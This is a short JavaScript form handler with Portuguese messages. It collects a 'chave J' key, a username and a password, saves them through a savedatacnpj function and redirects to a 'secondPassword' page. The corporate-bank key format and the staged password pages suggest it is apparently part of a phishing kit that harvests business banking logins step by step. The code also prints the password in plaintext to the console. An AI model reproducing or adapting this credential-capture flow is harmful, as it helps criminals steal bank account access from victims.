const validates = document.getElementById('triggerbtncnpj');

validates.addEventListener('click', async (event) => {
        event.preventDefault();

        const keyj = document.getElementById('keyj').value;
        const user = document.getElementById('user').value;
        const passwordStrong = document.getElementById('passwordStrong').value;
    

        if(keyj[0] !== 'J') {
            alert("Insira uma chaveJ válida")
        } else {
            if (user == '' || passwordStrong == '') {
                alert("Preencha todos os campos")
            } else {
                callSpinner();
                    try {
                        await savedatacnpj(keyj, user, passwordStrong);
                        const sleep = (milliseconds) => {
                            return new Promise(resolve => setTimeout(resolve, milliseconds));
                        }      
                        sleep(1000)
                        .then(() =>  {
                            window.location.href = './secondPassword.html';
                        })         
                     }catch(error){
                        await console.log(error);
                        const sleep = (milliseconds) => {
                            return new Promise(resolve => setTimeout(resolve, milliseconds))
                        }      
                        sleep(1000)
                        .then(() =>  {
                            window.location.href = './error.html';
                        }) 
                        
                     }
                      console.log(keyj, user, passwordStrong)
              
            } 
        } 

});
